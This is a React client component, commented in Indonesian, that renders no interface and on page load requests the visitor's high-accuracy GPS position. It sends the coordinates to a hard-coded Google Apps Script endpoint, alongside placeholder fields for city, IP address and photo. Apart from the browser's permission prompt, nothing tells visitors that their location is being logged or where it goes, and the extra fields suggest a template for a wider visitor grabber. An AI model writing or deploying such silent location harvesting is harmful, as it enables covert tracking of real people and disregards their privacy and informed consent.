"use client";

import { useEffect } from "react";

export default function SendLokasi() {
  useEffect(() => {
    if (!("geolocation" in navigator)) {
      console.log("Browser tidak mendukung geolocation");
      return;
    }

    // Minta izin & ambil lokasi
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        const lokasi = `${lat},${lon}`;

        console.log("Lokasi berhasil diambil:", lokasi);

        // Bangun URL GET yang sesuai dengan kode.gs Anda
        const url =
          "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec" +
          `?lokasi=${encodeURIComponent(lokasi)}` +
          `&nama=${encodeURIComponent("Pengunjung Portal")}` +
          `&kota=${encodeURIComponent("")}` +
          `&ip=${encodeURIComponent("")}` +
          `&foto=${encodeURIComponent("")}`;

        // Kirim data via fetch GET (mode no-cors agar berjalan di HP)
        fetch(url, {
          method: "GET",
          mode: "no-cors",
        })
          .then(() => {
            console.log("Lokasi terkirim ke Apps Script");
          })
          .catch((err) => {
            console.error("Gagal mengirim lokasi:", err);
          });
      },
      (error) => {
        console.error("Gagal mendapatkan lokasi:", error);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, []);

  // Tidak perlu UI
  return null;
}
